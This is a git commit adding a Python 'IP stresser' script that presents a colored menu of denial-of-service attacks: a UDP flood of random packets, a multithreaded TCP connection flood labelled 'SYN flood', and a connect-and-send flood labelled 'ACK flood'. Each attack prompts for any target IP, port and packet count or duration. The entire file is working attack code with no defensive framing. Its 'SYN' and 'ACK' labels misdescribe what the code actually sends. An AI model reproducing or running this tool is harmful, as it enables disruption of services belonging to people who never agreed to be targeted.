1fb1c41c4e9e62ca74bc38bd3945f91cd1525a2b
Pljeka <savicalexa991@gmail.com>
2025-09-21 17:27:59 +0400

    Create ip-str3ss3r.py

---
+++ ip-str3ss3r.py
@@ -0,0 +1,153 @@
+from socket import socket
+import threading
+import time
+import os
+import random
+import sys
+from colorama import Fore, Style, init 
+from socket import AF_INET, SOCK_DGRAM, SOCK_STREAM, socket
+
+init()
+
+banner = Fore.RED + """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣼⠀⠀⠀⠀⠈⠙⡆⢤⠀⠀⠀⠀⠀⣷⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⡷⡆⠀⣵⣶⣿⣾⣷⣸⣄⠀⠀⠀⢰⠾⡿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣽⣿⣿⣿⣿⡟⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣻⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠐⣻⣿⣿⡏⢹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡄⠀⠀⠀⠀⢻⣿⣿⣷⡌⠸⣿⣾⢿⡧⠀⠀⠀⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⣾⡿⢛⣵⣾⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢻⣿⣿⣿⣶⣌⠙⠋⠁⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣷⣮⡙⢿⣿⣆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣰⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⡀⠀⠀⠀⣠⣽⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣝⢿⣇⠀⠀⠀⠀
+⠀⠀⠀⣴⣯⣴⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⡿⢫⣾⣿⣿⣿⣿⣿⣿⡦⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⢴⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣧⣽⣦⠀⠀⠀
+⠀⠀⣼⣿⣿⣿⠟⢁⣴⣿⡿⢿⣿⣿⡿⠛⣰⣿⠟⣻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⢿⣿⣿⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣆⠙⢿⣿⣿⡿⢿⣿⣦⡈⠻⣿⣿⣿⣧⠀⠀
+⠀⡼⣻⣿⡟⢁⣴⡿⠋⠁⢀⣼⣿⠟⠁⣰⣿⠁⢰⣿⣿⣿⡿⣿⣿⣿⠿⠀⣠⣤⣾⣿⣿⣿⣿⣿⠀⠀⠽⣿⣿⣿⢿⣿⣿⣿⡆⠈⢿⣆⠀⠻⣿⣧⡀⠈⠙⢿⣦⡈⠻⣿⣟⢧⠀
+⠀⣱⣿⠋⢠⡾⠋⠀⢀⣠⡾⠟⠁⠀⢀⣿⠟⠀⢸⣿⠙⣿⠀⠈⢿⠏⠀⣾⣿⠛⣻⣿⣿⣿⣿⣯⣤⠀⠀⠹⡿⠁⠀⣿⠏⣿⡇⠀⠹⣿⡄⠀⠈⠻⢷⣄⡀⠀⠙⢷⣄⠙⣿⣎⠂
+⢠⣿⠏⠀⣏⢀⣠⠴⠛⠉⠀⠀⠀⠀⠈⠁⠀⠀⠀⠛⠀⠈⠀⠀⠀⠀⠈⢿⣿⣼⣿⣿⣿⣿⢿⣿⣿⣶⠀⠀⠀⠀⠀⠁⠀⠛⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠛⠦⣄⣀⣹⠀⠹⣿⡄
+⣼⡟⠀⣼⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠋⠁⠀⢹⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣧⠀⢻⣷
+⣿⠃⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣶⣦⣤⠀⠀⣿⡿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡆⠘⣿
+⣿⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠁⠈⢻⣷⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⣿
+⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣀⣀⣸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣿
+⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇
+⠈⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣴⡿⣷⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡿⣟⣿⣿⣶⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+""" + Fore.RED + """
+dev: github.com/Pljeka
+version: 0.0.1
+""" + Style.RESET_ALL
+
+class start_syn_flood(threading.Thread):
+    def __init__(self, target_ip, port, threads, duration):
+        super().__init__()
+        self.target_ip = target_ip
+        self.port = port
+        self.threads = threads
+        self.duration = duration
+        self.running = True
+
+    def run(self):
+        print(Fore.YELLOW + f"Starting SYN flood on {self.target_ip}:{self.port} for {self.duration}s with {self.threads} threads..." + Style.RESET_ALL)
+        end_time = time.time() + self.duration
+        def syn_flood():
+            while self.running and time.time() < end_time:
+                try:
+                    s = socket(AF_INET, SOCK_STREAM)
+                    s.settimeout(0.5)
+                    s.connect((self.target_ip, self.port))
+                    s.close()
+                except Exception:
+                    pass
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=syn_flood)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        while time.time() < end_time:
+            time.sleep(0.5)
+        self.running = False
+        print(Fore.GREEN + "SYN flood finished." + Style.RESET_ALL)
+
+class start_udp_flood(threading.Thread):
+    def __init__(self, target_ip, port, packets):
+        super().__init__()
+        self.target_ip = target_ip
+        self.port = port
+        self.packets = packets
+
+    def run(self):
+        print(Fore.YELLOW + f"Starting UDP flood on {self.target_ip}:{self.port} with {self.packets} packets..." + Style.RESET_ALL)
+        s = socket(AF_INET, SOCK_DGRAM)
+        for i in range(self.packets):
+            try:
+                bytes_ = random._urandom(1024)
+                s.sendto(bytes_, (self.target_ip, self.port))
+            except Exception:
+                pass
+        print(Fore.GREEN + "UDP flood finished." + Style.RESET_ALL)
+
+class start_ack_flood(threading.Thread):
+    def __init__(self, target_ip, port, packets):
+        super().__init__()
+        self.target_ip = target_ip
+        self.port = port
+        self.packets = packets
+
+    def run(self):
+        print(Fore.YELLOW + f"Starting ACK flood on {self.target_ip}:{self.port} with {self.packets} packets..." + Style.RESET_ALL)
+        for i in range(self.packets):
+            try:
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((self.target_ip, self.port))
+                s.send(b"ACK")
+                s.close()
+            except Exception:
+                pass
+        print(Fore.GREEN + "ACK flood finished." + Style.RESET_ALL)
+
+def main_menu():
+    while True:
+        print(banner)
+        print(Fore.RED + "1. UDP Flood")
+        print("2. SYN Flood")
+        print("3. ACK Flood")
+        print("4. Quit")
+        choice = input("Enter your choice (1-4): ")
+
+        if choice == "1":
+            print("UDP Flood selected")
+            time.sleep(1.5)
+            target_ip = input("Enter the target IP address: ")
+            port = int(input("Enter the target port (default 80): ") or 80)
+            packets = int(input("Enter the number of packets to send: "))
+            flood = start_udp_flood(target_ip, port, packets)
+            flood.start()
+            flood.join()
+        elif choice == "2":
+            print("SYN Flood selected")
+            time.sleep(1.5)
+            target_ip = input("Enter the target IP address: ")
+            port = int(input("Enter the target port (default 80): ") or 80)
+            threads = int(input("Enter the number of threads to use: "))
+            duration = int(input("Enter the duration of the attack (in seconds): "))
+            flood = start_syn_flood(target_ip, port, threads, duration)
+            flood.start()
+            flood.join()
+        elif choice == "3":
+            print("ACK Flood selected")
+            time.sleep(1.5)
+            target_ip = input("Enter the target IP address: ")
+            port = int(input("Enter the target port (default 80): ") or 80)
+            packets = int(input("Enter the number of packets to send: "))
+            flood = start_ack_flood(target_ip, port, packets)
+            flood.start()
+            flood.join()
+        elif choice == "4":
+            print("Quitting...")
+            break
+        else:
+            print("Invalid choice. Please try again.")
+
+if __name__ == "__main__":
+    main_menu()
+
